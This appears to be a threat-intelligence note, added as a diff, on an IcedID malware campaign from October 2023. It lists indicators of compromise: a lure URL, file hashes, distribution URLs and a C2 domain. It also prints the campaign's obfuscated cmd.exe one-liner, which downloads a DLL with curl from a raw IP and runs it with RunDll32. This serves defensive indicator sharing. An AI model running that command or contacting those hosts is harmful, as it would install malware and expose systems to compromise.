@@ -1,0 +1,43 @@
+IcedID | 19.10.2023 | Campaign 1075006942
+
+***************************************
+
+.url https://gonow.cl/ud/?lKFtoBWUlVJthcZzqaiXLMizAXcj
+.zip bbdb7cbbef030d6cb11d264b975020a60c87900864bee415e626f11412ca13cb 
+.js 81368665503842359666147225c19100c4e8ba6ce1284930e9fbff355ba3ab02
+.exe cad10418cc22a06f298443c7c531817aa09b45e50e7e067d26cd38be68e2c0de
+
+***************************************
+
+Exec >>
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\F122.js
+
+cmd.exe /c SNq || eCHo SNq & pInG SNq || cUrL http://88.99.82.67/UCTF/arane -o %tMp%\SNq.dll & pInG -n 3 SNq || RunDll32 %tMP%\SNq.dll scab /k feromon698 & EXiT sxunRCDjLfmD
+
+pInG  SNq 
+
+pInG  -n 3 SNq 
+
+RunDll32  C:\Users\Admin\AppData\Local\Temp\SNq.dll scab /k feromon698
+
+***************************************
+
+.zip distro
+
+.dll distro
+
+http://89.147.111.46/gWUA/amalg
+http://198.98.61.173/Ftn/level
+
+***************************************
+
+c2 downloader
+
+http://mistulinno.com/
+
+c2's
+
+
+
+***************************************
